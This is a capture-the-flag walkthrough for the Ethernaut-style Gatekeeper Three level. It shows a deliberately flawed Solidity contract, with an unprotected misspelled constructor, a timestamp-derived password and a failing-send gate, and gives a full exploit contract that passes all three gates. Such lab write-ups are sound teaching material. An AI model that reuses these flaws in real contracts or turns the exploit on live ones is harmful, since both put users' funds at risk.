# Gatekeeper Three

## Challenge Description

Cope with gates and become an entrant.

##### Things that might help:

-   Recall return values of low-level functions.
-   Be attentive with semantic.
-   Refresh how storage works in Ethereum.

## Challenge Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SimpleTrick {
    GatekeeperThree public target;
    address public trick;
    uint private password = block.timestamp;

    constructor(address payable _target) {
        target = GatekeeperThree(_target);
    }

    function checkPassword(uint _password) public returns (bool) {
        if (_password == password) {
            return true;
        }
        password = block.timestamp;
        return false;
    }

    function trickInit() public {
        trick = address(this);
    }

    function trickyTrick() public {
        if (address(this) == msg.sender && address(this) != trick) {
            target.getAllowance(password);
        }
    }
}

contract GatekeeperThree {
    address public owner;
    address public entrant;
    bool public allowEntrance;

    SimpleTrick public trick;

    function construct0r() public {
        owner = msg.sender;
    }

    modifier gateOne() {
        require(msg.sender == owner);
        require(tx.origin != owner);
        _;
    }

    modifier gateTwo() {
        require(allowEntrance == true);
        _;
    }

    modifier gateThree() {
        if (
            address(this).balance > 0.001 ether &&
            payable(owner).send(0.001 ether) == false
        ) {
            _;
        }
    }

    function getAllowance(uint _password) public {
        if (trick.checkPassword(_password)) {
            allowEntrance = true;
        }
    }

    function createTrick() public {
        trick = new SimpleTrick(payable(address(this)));
        trick.trickInit();
    }

    function enter() public gateOne gateTwo gateThree {
        entrant = tx.origin;
    }

    receive() external payable {}
}
```

## Challenge Solution Walkthrough

To pass the three gates in the contract, let's go through each gate and provide the necessary steps:

**Gate One:** This gate requires the `msg.sender` to be the `owner` but the `tx.origin` should not be the `owner`. We can see a `construct0r()` in the contract the sets the `owner`, but there is a typo in the name of it, so it will not be executed when the contract is being created. To verify, open the console and write the command below:

```solidity
> await contract.owner()
< '0x0000000000000000000000000000000000000000'
```

So, we can call the `construct0r()` function to become the `owner`; however, we should call it from a contract, and using that contract call the `construct0r()` function. The underlying reason is that this gate requires the `msg.sender` to be the `owner`, but not the `tx.origin`. If we call the contract directly, `msg.sender` would be equal to `tx.origin`, so we create and deploy a contract and using that contract we call the `construct0r()` to make the deployed contract the `owner`, and we are not the `owner` anymore.

**Gate Two:** For passing the second gate, we have to set `allowEntracnce` variable to true. We can see that it is initially false:

```javascript
> await contract.allowEntrance()
< false
```

To make it true, we have call the `getAllowance()` function with the correct `password`, but previously, we have to create the contract, because the contract has not been created yet. To verify, we can run the command below:

```javascript
> await contract.trick()
< '0x0000000000000000000000000000000000000000'
```

So, we have to first call the `createTrick()` function. When the `SimpleTrick` contract is being created `uint private password = block.timestamp;` will be executed, so if we call the `createTrick()` function and `getAllowance()` function in the same time to be mined in the same block, for both of them the `block.timestamp` would be the same. So, we create a contract and in that contract we call `createTrick()` and `getAllowance(block.timestamp)` in a function.

**Gate Three:** To pass this gate, we have to transfer more than 0.001 ether to this contract, but we have to not receive any ethers. To do so, we create a contract, but do not implement any `receive()` or `fallback()` function. So, no one can send ether to the contract.

Based on the given information, the solution contract would be:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./GatekeeperThree.sol";

error TransactionFailed();

contract GatekeeperThreeSolution {
    GatekeeperThree public gatekeeperThree;

    constructor(address gatekeeperThreeAddress) {
        gatekeeperThree = GatekeeperThree(payable(gatekeeperThreeAddress));
    }

    function solveChallenge() public payable {
        gatekeeperThree.construct0r();

        gatekeeperThree.createTrick();
        gatekeeperThree.getAllowance(block.timestamp);

        (bool success, ) = address(gatekeeperThree).call{ value: msg.value }(
            ""
        );
        if (success == false) revert TransactionFailed();

        gatekeeperThree.enter();
    }
}
```

In the `solveChallenge()` function we first call the `construct0r()` to make the contract `owner`. Then, we call the `createTrick()` function and `getAllowance(block.timestamp)` to make `allowEntrance` to true. Note that since both of them will be mined in the same block, the `block.timestamp` would be the same. Finally, we send 0.001 ether to the `GatekeeperThree` contract, but we do not define any `fallback()` or `receive()` function.

Congratulations! You have successfully completed the challenge.

## Challenge Description After Solving

Nice job! For more information read [this](https://web3js.readthedocs.io/en/v1.2.9/web3-eth.html?highlight=getStorageAt#getstorageat) and [this](https://medium.com/loom-network/ethereum-solidity-memory-vs-storage-how-to-initialize-an-array-inside-a-struct-184baf6aa2eb).
